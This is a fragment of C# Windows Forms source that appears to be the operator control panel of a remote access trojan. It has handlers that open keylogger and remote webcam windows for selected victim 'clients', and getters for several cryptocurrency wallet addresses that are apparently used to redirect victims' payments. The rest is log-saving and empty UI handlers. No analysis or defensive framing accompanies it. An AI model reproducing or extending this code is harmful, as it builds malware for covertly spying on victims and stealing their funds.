            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        public string GetBTCAddress() => BTCTextBox.Text;
        public string GetLTCAddress() => LTCTextBox.Text;
        public string GetETHAddress() => ETHTextBox.Text;
        public string GetXMRAddress() => XMRTextBox.Text;
        public string GetSOLAddress() => SOLTextBox.Text;
        public string GetDASHAddress() => DASHTextBox.Text;
        public string GetXRPAddress() => XRPTextBox.Text;
        public string GetTRXAddress() => TRXTextBox.Text;
        public string GetBCHAddress() => BCHTextBox.Text;

        private void taskTestToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void saveLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Log File";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.Text);
                }
            }
        }

        private void saveSlectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(DebugLogRichBox.SelectedText))
            {
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                saveFileDialog.Title = "Save Selected Text";
                saveFileDialog.DefaultExt = "txt";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(saveFileDialog.FileName, DebugLogRichBox.SelectedText);
                }
            }
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DebugLogRichBox.Clear();
        }

        private void clearSelectedToolStripMenuItem1_Click(object sender, EventArgs e)
        {
          
        }
    }
}